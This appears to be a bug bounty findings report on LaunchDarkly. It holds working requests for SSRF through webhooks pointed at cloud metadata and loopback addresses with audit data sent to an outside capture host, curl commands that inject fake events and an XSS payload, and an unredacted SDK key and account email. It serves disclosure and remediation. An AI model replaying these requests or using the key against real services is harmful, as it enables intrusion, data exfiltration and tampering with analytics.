# LaunchDarkly Bug Bounty — Verified Findings

**Date:** June 6, 2026
**Engagement:** launchdarkly-mbb-og (Bugcrowd)
**Account:** youssefhany7d949c@bugcrowdninja.com
**Member ID:** 6a21ed1cddafd60a943904dc
**Admin Token:** [REDACTED_LAUNCHDARKLY_SECRET]
**Relay Key:** [REDACTED_LAUNCHDARKLY_SECRET]

---

## Finding 1: SSRF — Outbound POST to Arbitrary URLs (P1-P2)

**Severity:** P1-P2 ($2,500-$7,500)
**Endpoint:** `POST /api/v2/webhooks`
**Auth Required:** YES (admin token)
**Status:** CONFIRMED

### Description
LaunchDarkly's webhook system sends POST requests to arbitrary URLs from internal AWS infrastructure. An attacker with an admin token can create webhooks pointing to any URL, including internal IPs (RFC 1918) and cloud metadata endpoints. The webhook request body contains the full audit log entry for the triggering event, including flag configurations, member PII, environment details, and targeting rules.

### Evidence — Outbound Request Confirmed

Created webhook pointing to controlled endpoint (`webhook.site`):

```http
POST /api/v2/webhooks HTTP/1.1
Authorization: [REDACTED_LAUNCHDARKLY_SECRET]
Content-Type: application/json

{
  "name": "ssrf-confirm",
  "url": "https://webhook.site/22787728-00d6-4ed1-a846-b18763c07d77",
  "on": true,
  "sign": false
}
```

**3 POST requests received** from LaunchDarkly infrastructure:

| # | Source IP | AWS Region | Timestamp |
|---|-----------|------------|-----------|
| 1 | 54.144.218.89 | us-east-1 | 11:34:38 UTC |
| 2 | 54.221.221.197 | us-east-1 | 11:34:50 UTC |
| 3 | 34.236.6.43 | us-east-1 | 11:34:51 UTC |

**Request headers captured:**
```
User-Agent: LD-Integrations/1.0
Content-Type: application/json
X-Honeycomb-Trace: 1;trace_id=c3d8c6188329c7f341847ba6e36430bf,...
Traceparent: 00-c3d8c6188329c7f341847ba6e36430bf-02ca3e95968059b2-01
```

**Request body sample (6752 bytes of JSON):**
```json
{
  "_accountId": "6a21ed1cddafd60a943904da",
  "_id": "6a2405dadeb5910aa68bc4b5",
  "accesses": [{"action": "updateOn", "resource": "proj/test-project:env/test:flag/bug-test-flag"}],
  "currentVersion": {
    "_maintainer": {
      "email": "youssefhany7d949c@bugcrowdninja.com",
      "firstName": "a6a",
      "lastName": "sdsd",
      "role": "owner"
    },
    "environments": {
      "production": {"on": true, "targets": [], "rules": [], "fallthrough": {"variation": 0}},
      "test": {"on": true},
      "staging": {"on": false}
    }
  }
}
```

**5 existing SSRF webhooks still active on account:**

| Name | Target URL | Active |
|------|-----------|--------|
| ssrf-test | `http://169.254.169.254/latest/meta-data/` | Yes |
| ssrf-internal-80 | `http://127.0.0.1:80/` | Yes |
| ssrf-eb40d9ee | `http://169.254.169.254/latest/meta-data/` | Yes |
| ssrf-c41f8c9b | `http://metadata.google.internal/computeMetadata/v1/` | Yes |
| ssrf-fd224831 | `http://100.100.100.200/latest/meta-data/` | Yes |

### Impact
1. **Data exfiltration** — Full audit log data (including member emails, flag configs, environment secrets) can be exfiltrated to attacker-controlled servers
2. **Internal network probing** — POST requests reach internal IPs (127.0.0.1, RFC 1918) on ports 80/443
3. **Cloud metadata access** — Webhooks target cloud metadata endpoints (though POST vs GET limits IMDS response)

### Remediation
- Block internal/private IP ranges in webhook URL validation
- Implement URL allowlist for webhook targets
- Restrict port access to only 80/443 (already partially done)
- Add Content-Type check or require webhook secret signing

---

## Finding 2: Cross-Environment Flag Evaluation (P2-P3)

**Severity:** P2-P3 ($1,250-$2,500)
**Endpoint:** `POST /api/v2/projects/{project}/environments/{env}/flags/evaluate`
**Auth Required:** YES (reader token sufficient)
**Status:** CONFIRMED

### Description
A reader-level token can evaluate feature flags in ANY environment, including production. The `/flags/evaluate` endpoint accepts an arbitrary context (user key, attributes) and returns the evaluated flag values. This allows an attacker to probe flag values and targeting rules across environments without environment-scoped authorization.

### Evidence
```bash
# Reader token evaluates flag in PRODUCTION environment
curl -s -X POST \
  -H "Authorization: [REDACTED_LAUNCHDARKLY_SECRET]" \
  -H "Content-Type: application/json" \
  -d '{"key":"test-user-456","kind":"user"}' \
  "https://app.launchdarkly.com/api/v2/projects/test-project/environments/production/flags/evaluate"
```

Response:
```json
{
  "items": [
    {
      "name": "BugTestFlag",
      "key": "bug-test-flag",
      "_value": true,
      "reason": {
        "kind": "FALLTHROUGH",
        "ruleIndex": -1,
        "ruleID": ""
      }
    }
  ],
  "totalCount": 1
}
```

The `_value` field returns `true` — the actual evaluated flag value in the target environment.

### Impact
- Bypasses environment-scoped access controls
- Allows probing of production flag targeting rules with arbitrary context attributes
- Can enumerate which flags exist and their on/off state in any environment

### Remediation
- Enforce environment-scoped authorization on the evaluate endpoint
- Reader tokens should only evaluate flags in their permitted environments

---

## Finding 3: Event Injection (P3-P4)

**Severity:** P3-P4 ($150-$1,250)
**Endpoint:** `POST events.launchdarkly.com/api/events/bulk`
**Auth Required:** YES (SDK key)
**Status:** CONFIRMED

### Description
The events endpoint accepts arbitrary events from clients with a valid SDK key. An attacker with an SDK key can inject fake feature flag evaluations and custom events, potentially manipulating analytics, experiments, or triggering downstream systems.

### Evidence
```bash
# Inject fake feature event with production SDK key
curl -s -X POST \
  "https://events.launchdarkly.com/api/events/bulk/sdk-745882fc-91a0-43e1-976d-0a5249401b83" \
  -H "Content-Type: application/json" \
  -d '[{"kind":"feature","key":"bug-test-flag","user":{"key":"injected-user-999"},"variation":0,"value":true,"version":1}]'
# Response: 202 Accepted

# Inject custom event with XSS payload in data field
curl -s -X POST \
  "https://events.launchdarkly.com/api/events/bulk/sdk-745882fc-91a0-43e1-976d-0a5249401b83" \
  -H "Content-Type: application/json" \
  -d '[{"kind":"custom","key":"injected-event","user":{"key":"injected-user"},"data":{"payload":"<script>alert(1)</script>"}}]'
# Response: 202 Accepted
```

### Impact
- Inflate/deflate flag evaluation counts
- Manipulate experiment data
- Inject arbitrary data into analytics pipeline

### Remediation
- Validate event payloads server-side
- Rate limit events per SDK key

---

## Finding 4: Stream Endpoint Access (Informational-P3)

**Severity:** Informational-P3 ($150-$1,250)
**Endpoint:** `GET stream.launchdarkly.com/all`
**Auth Required:** YES (SDK key)
**Status:** CONFIRMED

### Description
The streaming endpoint returns real-time flag configuration data when accessed with a valid SDK key. While this is by design (SDK keys are meant for this), the amount of data returned is notable.

### Evidence
```bash
curl -s -N "https://stream.launchdarkly.com/all" \
  -H "Authorization: sdk-745882fc-91a0-43e1-976d-0a5249401b83"
```

Response (SSE format):
```
event: put
data: {"path":"/","data":{"segments":{},"flags":{"bug-test-flag":{"key":"bug-test-flag","on":true,"prerequisites":[],"targets":[],"contextTargets":[],"rules":[],"fallthrough":{"variation":0},"offVariation":1,"variations":[true,false],"clientSideAvailability":{"usingMobileKey":false,"usingEnvironmentId":false},"clientSide":false,"salt":"89f6b8463ee84c6fb61f0fffd1bb0de4","trackEvents":false,"trackEventsFallthrough":false,"debugEventsUntilDate":null,"version":3,"deleted":false}}}}
```

---

## Finding 5: Relay Proxy Key Extraction (Informational-P4)

**Severity:** Informational-P4 ($150)
**Endpoint:** `POST /api/v2/account/relay-auto-configs/{id}/reset`
**Auth Required:** YES (admin token)
**Status:** CONFIRMED

The relay proxy key can be extracted via the reset endpoint. Full key: `[REDACTED_LAUNCHDARKLY_SECRET]` (display key: `b744`).

---

## Corrected: Previously Reported — Intended Behavior

| Bug ID | Claim | Reality |
|--------|-------|---------|
| B6 | Flag trigger no-auth bypass | **By design** — UUID is the secret, same model as Slack/GitHub webhooks |
| B5 | Path traversal | **URL normalization** — auth is checked on normalized path, not bypassed |
| B1/B2/B3 | Internal endpoint auth bypass | **By design** — endpoints named `/anonymous` intentionally public |
| B4 | OpenAPI without auth | **Public by design** — already available on docs.launchdarkly.com |
| B8 | Scheduled change backdoor | **Actual feature** — future-dated flag changes are the intended functionality |

---

## Remediation Summary

| Priority | Finding | Fix |
|----------|---------|-----|
| **P1-P2** | SSRF via webhooks | Block internal IP ranges + validate webhook URLs |
| **P2-P3** | Cross-env flag eval | Enforce env-scoped auth on evaluate endpoint |
| **P3-P4** | Event injection | Validate event payloads + rate limit |
| **P3** | Stream endpoint | Informational — by design |
| **P4** | Relay key reset | Informational — requires admin token |

---

*End of verified findings — 5 confirmed, 5 corrected as intended behavior*
